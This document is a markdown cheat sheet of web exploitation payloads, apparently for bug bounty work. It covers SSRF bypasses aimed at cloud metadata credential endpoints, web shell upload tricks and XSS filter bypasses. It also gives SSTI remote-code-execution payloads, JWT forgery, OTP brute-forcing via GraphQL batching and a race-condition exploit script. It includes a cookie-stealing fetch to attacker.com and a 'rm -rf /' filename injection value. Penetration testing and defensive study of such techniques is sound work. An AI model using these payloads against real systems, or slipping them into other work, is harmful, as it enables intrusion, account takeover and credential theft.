# Web Vulnerability Bypass Tables — Quick Reference

Phase 6 exploitation lookup. Actual payloads and techniques for bypassing common defenses.

---

## SSRF — IP Bypass Techniques (11)

| # | Technique | Payload | Notes |
|---|-----------|---------|-------|
| 1 | Decimal IP | `http://2130706433` | 127.0.0.1 as single decimal |
| 2 | Octal IP | `http://0177.0.0.1` | Octal 0177 = 127 |
| 3 | Hex IP | `http://0x7f.0x0.0x0.0x1` | Hex representation |
| 4 | Short IP | `http://127.1` | Abbreviated notation |
| 5 | IPv6 loopback | `http://[::1]` | IPv6 loopback |
| 6 | IPv6 mapped IPv4 | `http://[::ffff:127.0.0.1]` | IPv4-mapped IPv6 |
| 7 | DNS rebinding | Attacker DNS → resolves to internal IP | First check = external, fetch = internal |
| 8 | Redirect chain | External URL → 302 → `http://169.254.169.254` | Bypass checks on initial URL only |
| 9 | URL parser confusion | `http://attacker.com#@internal` | Parser inconsistency between check and fetch |
| 10 | CNAME to internal | Attacker domain CNAME → internal hostname | DNS points inward |
| 11 | Mixed hex IPv6 | `http://[::ffff:0x7f000001]` | Combined hex + IPv6 mapped |

### SSRF High-Value Targets

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/   # AWS IMDSv1
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/  # Azure
http://localhost:6379          # Redis
http://localhost:9200          # Elasticsearch
http://localhost:2375          # Docker API (RCE)
http://localhost:8080          # Admin panels
```

### SSRF Injection Points

```
?url=, ?src=, ?redirect=, ?next=, ?image=, ?webhook=, ?callback=
JSON: {"webhook": "http://...", "avatar_url": "http://..."}
SVG: <image href="http://internal">
PDF generators, image resizers, URL preview/unfurl features
```

---

## File Upload — Bypass Techniques (10)

| # | Attack | Payload | Why It Works |
|---|--------|---------|--------------|
| 1 | Extension bypass | `shell.php.jpg`, `shell.pHp`, `shell.php5`, `shell.phtml` | Allowlist checks first ext or case-insensitive miss |
| 2 | Null byte | `shell.php%00.jpg` | Truncates at null in C-based parsers |
| 3 | Double extension | `shell.jpg.php` | Server executes based on last extension |
| 4 | MIME spoof | `Content-Type: image/jpeg` with `.php` body | Server trusts Content-Type header over actual content |
| 5 | Magic bytes prefix | Prepend `GIF89a;` to PHP code | Passes magic byte validation, still executes as PHP |
| 6 | Polyglot file | Valid as both JPEG and PHP | Passes image validation, executes as code |
| 7 | SVG JavaScript | `<svg onload="alert(1)">` | SVG is XML, allows script execution |
| 8 | XXE in DOCX | Malicious XML inside Office ZIP structure | External entity processing on upload |
| 9 | ZIP slip | `../../../etc/passwd` as filename in archive | Path traversal during extraction |
| 10 | Filename injection | `; rm -rf /` or `$(command)` in filename | Shell metachar injection if filename used in commands |

### Magic Bytes Reference

```
JPEG:       FF D8 FF
PNG:        89 50 4E 47 0D 0A 1A 0A
GIF:        47 49 46 38  (ASCII: GIF89a or GIF87a)
PDF:        25 50 44 46  (ASCII: %PDF)
ZIP/DOCX:   50 4B 03 04
```

### SVG XSS Payload

```xml
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

---

## Open Redirect — Bypass Techniques (11)

| # | Technique | Payload | Why It Works |
|---|-----------|---------|--------------|
| 1 | @ symbol | `https://legit.com@evil.com` | Browser navigates to evil.com (userinfo section) |
| 2 | Subdomain abuse | `https://legit.com.evil.com` | evil.com controls the subdomain |
| 3 | Protocol tricks | `javascript:alert(1)` | XSS via redirect parameter |
| 4 | Double encoding | `%252f%252fevil.com` | Decodes to `//evil.com` after double decode |
| 5 | Backslash | `https://legit.com\@evil.com` | Parsers normalize `\` to `/` |
| 6 | Protocol-relative | `//evil.com` | Uses current page's protocol |
| 7 | Null byte | `https://legit.com%00.evil.com` | Some parsers truncate at null |
| 8 | Unicode IDN | `https://legіt.com` (Cyrillic і) | Visually identical, different domain |
| 9 | Data URL | `data:text/html,<script>...</script>` | Direct payload execution |
| 10 | Fragment abuse | `https://legit.com#@evil.com` | Inconsistent parsing of fragment |
| 11 | Chained redirect | `target.com/callback?redirect_uri=//evil.com` | OAuth/callback endpoint chains |

### Open Redirect → Impact Escalation

```
Open redirect alone                    = Informational (most programs)
Open redirect + OAuth code theft       = ATO (Critical)
Open redirect + phishing (login page)  = Medium
Open redirect + token leak in Referer  = High
```

---

## IDOR — Variants (8)

| # | Variant | Example | Detection |
|---|---------|---------|-----------|
| 1 | Numeric ID swap | `/api/user/123/profile` → change to 124 | Increment/decrement IDs |
| 2 | UUID swap | Enumerate UUID via email invite or other endpoint | Find UUIDs in responses, JS, emails |
| 3 | Indirect IDOR | `POST /api/export?report_id=456` | Object referenced indirectly |
| 4 | Parameter addition | Add `?user_id=other` to request | Backend uses unexpected param |
| 5 | HTTP method swap | PUT protected, DELETE not | Try all methods on same endpoint |
| 6 | Old API version | `/v1/users/123` lacks auth that `/v2/` has | Version downgrade |
| 7 | GraphQL node | `{ node(id: "base64(User:456)") { email } }` | Global node resolution |
| 8 | WebSocket | `{"action":"get_history","userId":"victim-UUID"}` | Client-supplied IDs in WS messages |

### IDOR Testing Protocol

```
1. Two accounts (A=attacker, B=victim)
2. Log in as B, perform all actions, note all IDs in requests/responses
3. Replay B's requests with A's token but B's IDs
4. Test EVERY HTTP method (GET, PUT, DELETE, PATCH)
5. Check API v1 vs v2 vs no-version
6. Check GraphQL node() queries
7. Check WebSocket messages for client-supplied IDs
8. Check indirect references (export, share, invite endpoints)
```

### IDOR Impact Escalation

```
IDOR + Read PII                = Medium
IDOR + Write (modify data)     = High
IDOR + Admin endpoint          = Critical (privilege escalation)
IDOR + Account takeover path   = Critical
IDOR + Mass enumeration        = High (quantify affected users)
```

---

## XSS — Filter Bypass Payloads

### Core Bypasses

```javascript
// Basic blocked? Try event handlers
<img src=x onerror="alert(1)">
<svg onload="alert(1)">
<body onpageshow="alert(1)">
<details open ontoggle="alert(1)">

// CSP bypass — unsafe-inline blocked
<img src=x onerror="fetch('https://attacker.com?d='+btoa(document.cookie))">

// Angular template injection
{{constructor.constructor('alert(1)')()}}

// mXSS — mutation-based
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

// Protocol handler
<a href="javascript:alert(1)">click</a>
<iframe src="javascript:alert(1)">

// Without parentheses
<img src=x onerror=alert`1`>
<img src=x onerror=window.onerror=alert;throw+1>

// Without alert keyword
<img src=x onerror="window['al'+'ert'](1)">
<img src=x onerror="self[atob('YWxlcnQ=')](1)">

// SVG namespace
<svg><script>alert&#40;1&#41;</script></svg>

// Encoding tricks
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

### DOM XSS Sinks (grep targets)

```javascript
innerHTML = userInput           // HIGH RISK
outerHTML = userInput
document.write(userInput)
eval(userInput)
setTimeout(userInput, ...)      // string form
element.src = userInput         // javascript: URI possible
location.href = userInput
window.open(userInput)
$.html(userInput)               // jQuery
```

### XSS Impact Escalation

```
Self-XSS only                          = Won't pay (don't submit)
Reflected XSS (requires click)         = Medium
Stored XSS (fires on page load)        = High
XSS + CSRF token theft                 = CSRF bypass on critical action
XSS + credential theft (fake login)    = ATO
XSS + service worker registration      = Persistent XSS across pages
XSS on admin panel                     = Critical
```

---

## MFA/2FA — Bypass Patterns (7)

| # | Pattern | Technique | Impact |
|---|---------|-----------|--------|
| 1 | No rate limit on OTP | Brute force all 1M 6-digit codes | ATO (Critical) |
| 2 | OTP not invalidated | Reuse same OTP after logout/re-login | Persistent ATO |
| 3 | Response manipulation | Change `{"success":false}` → `{"success":true}` | Client-side only check |
| 4 | Skip MFA step | Access `/dashboard` directly with pre-MFA session cookie | Workflow bypass |
| 5 | Race condition | Send same OTP simultaneously from two sessions | Double-use before invalidation |
| 6 | Backup code brute force | 6-8 digit backup codes with no rate limit | ATO via backup path |
| 7 | Remember device abuse | Steal "remember device" cookie, use from new IP/browser | Device trust not bound |

---

## JWT — Attack Techniques

```python
# None algorithm attack
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "admin", "role": "admin"}
token = base64(header) + "." + base64(payload) + "."  # empty signature

# RS256 → HS256 algorithm confusion
# Get public key from /.well-known/jwks.json
# Sign with public key as HMAC secret
token = jwt.encode({"sub": "admin"}, public_key, algorithm="HS256")

# Weak secret brute force
hashcat -a 0 -m 16500 jwt.txt wordlist.txt
```

---

## SAML — Attack Techniques

| # | Attack | Impact |
|---|--------|--------|
| 1 | XML Signature Wrapping (XSW) | Inject unsigned assertion, signature still validates against original | Critical — ATO any user |
| 2 | Comment injection in NameID | `admin<!---->@company.com` — signer sees with comment, app strips it | High — admin ATO |
| 3 | Signature stripping | Remove `<Signature>` element entirely, modify NameID | Critical — if server doesn't require sig |
| 4 | XXE in assertion | `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` | High — file read/SSRF |
| 5 | NameID manipulation | Change NameID to `admin@company.com` after stripping/wrapping | Depends on validation |

---

## Prototype Pollution

```javascript
// Server-side Node.js
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}

// URL parameter form
?__proto__[isAdmin]=true&__proto__[role]=superadmin

// Impact: privilege escalation, RCE via gadgets (e.g., child_process options)
```

---

## CORS Exploitation

```bash
# Test: does origin reflect + allow credentials?
curl -sI -H "Origin: https://evil.com" https://target.com/api/user/me

# Vulnerable response:
# Access-Control-Allow-Origin: https://evil.com
# Access-Control-Allow-Credentials: true
# → Attacker reads authenticated responses cross-origin
```

---

## Race Condition — Targets

| Action | Expected Bug | Impact |
|--------|-------------|--------|
| Coupon/voucher redemption | Double-spend | Financial |
| Like/vote/follow | Inflated counts | Integrity |
| File upload then process | Upload malicious + bypass check | RCE/XSS |
| Account balance operations | Overdraw/double-spend | Financial |
| Invite/referral bonus | Unlimited bonuses | Financial |
| Limited resource allocation | Exceed quota | Resource abuse |
| Password reset + login | Reset old password, login with old | Auth bypass |

### Race Condition Testing

```python
# Python async (true parallel)
import asyncio, aiohttp

async def race_request(session, url, data, headers):
    async with session.post(url, json=data, headers=headers) as resp:
        return resp.status, await resp.text()

async def exploit_race(url, data, headers, n=20):
    async with aiohttp.ClientSession() as session:
        tasks = [race_request(session, url, data, headers) for _ in range(n)]
        results = await asyncio.gather(*tasks)
        for i, r in enumerate(results):
            print(f"Request {i}: {r[0]}")

asyncio.run(exploit_race(
    url="https://target.com/api/redeem",
    data={"code": "PROMO50"},
    headers={"Authorization": "Bearer TOKEN"},
    n=20
))
```

---

## Business Logic — Bypass Patterns

```
# Negative/zero value bypass
POST /api/transfer {"amount": -100}     → credits attacker, debits victim
POST /api/cart {"quantity": 0}          → adds item free
POST /api/refund {"amount": 99999}      → refunds more than purchased

# Workflow step skip
Normal: select plan → add payment → confirm → activate
Attack: skip to /confirm?plan=premium&skip_payment=true

# Parameter pollution
POST /api/transfer?from=attacker&to=victim&amount=100&from=victim
# Which 'from' does the server use? Backend and WAF may disagree.

# JSON duplicate keys
{"user":"attacker","user":"admin"}  # Which one wins?
```

---

## SSTI — Detection & RCE Payloads

### Detection (try all on input fields)

```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity
<%= 7*7 %>       → 49 = ERB (Ruby)
#{7*7}           → 49 = Mako
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (confirms not Twig)
```

### RCE Payloads

```python
# Jinja2 (Python/Flask)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig (PHP/Symfony)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# ERB (Ruby)
<%= `id` %>

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}

# Thymeleaf (Spring)
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

---

## GraphQL — Exploitation

```graphql
# Introspection (even when "disabled" — try GET, different content types)
{__schema{types{name,fields{name,type{name,kind,ofType{name,kind}}}}}}

# IDOR via node() — bypasses per-object auth
{ node(id: "dXNlcjoy") { ... on User { email phoneNumber ssn } } }

# Alias-based enumeration
{
  a1: user(id: "1") { email }
  a2: user(id: "2") { email }
  a3: user(id: "3") { email }
}

# Batching for rate limit bypass
[
  {"query": "mutation{login(email:\"victim@test.com\",otp:\"0001\"){token}}"},
  {"query": "mutation{login(email:\"victim@test.com\",otp:\"0002\"){token}}"},
  {"query": "mutation{login(email:\"victim@test.com\",otp:\"0003\"){token}}"}
]

# Suggestion abuse (field discovery when introspection is off)
{ use }
# Error: "Did you mean 'user'? 'users'? 'userAdmin'?"
```

---

## Cache Poisoning / Web Cache Deception

### Cache Poisoning (unkeyed header injection)

```bash
# Find unkeyed headers reflected in response
curl -s "https://target.com/" -H "X-Forwarded-Host: evil.com" | grep "evil.com"
curl -s "https://target.com/" -H "X-Forwarded-Scheme: http" | grep "http://"
curl -s "https://target.com/" -H "X-Original-URL: /admin" | grep "admin"

# If reflected + cached → all users get poisoned response
```

### Web Cache Deception (trick cache into storing private data)

```bash
# Victim visits (via link):
https://target.com/account/settings/nonexistent.css
# Cache sees .css → caches the private response
# Attacker requests same URL → gets victim's data

# Variants:
/account/settings%2F..%2Fstatic.css
/account/settings;.css
/account/settings/.css
```

---

## ATO — Account Takeover Paths (5 primary)

| # | Path | Technique |
|---|------|-----------|
| 1 | Password reset poisoning | `Host: attacker.com` or `X-Forwarded-Host: attacker.com` on reset request |
| 2 | Reset token in Referer leak | Page loads external JS → Referer header contains token |
| 3 | Predictable reset tokens | Sequential or timestamp-based tokens → brute force |
| 4 | Token not expiring | Old tokens still valid after new ones issued |
| 5 | Email change without re-auth | `PUT /api/user/email {"new_email": "attacker@evil.com"}` — no password required |

---

## HTTP Method Override (WAF Bypass)

```bash
curl -X POST https://target.com/api/admin/users -H "X-HTTP-Method-Override: DELETE"
curl -X POST https://target.com/api/admin/users -H "X-Method-Override: PUT"
curl -X POST https://target.com/api/admin/users -H "X-Original-Method: PATCH"
```

---

## Mass Assignment — Common Fields to Inject

```json
{
  "role": "admin",
  "is_admin": true,
  "verified": true,
  "credits": 999999,
  "permissions": ["*"],
  "email_verified": true,
  "account_type": "premium"
}
```

---

## Subdomain Takeover — Fingerprints

```
"There isn't a GitHub Pages site here"  → GitHub Pages (register repo)
"NoSuchBucket"                          → AWS S3 (create bucket)
"No such app"                           → Heroku (create app)
"404 Web Site not found"                → Azure App Service
"Fastly error: unknown domain"          → Fastly CDN
"project not found"                     → GitLab Pages
```

### Impact Escalation

```
Basic takeover                         → Low/Medium
+ Cookies scoped to .target.com        → High (credential theft)
+ OAuth redirect_uri on subdomain      → Critical (ATO)
+ CSP allowlist includes subdomain     → Critical (XSS anywhere)
```
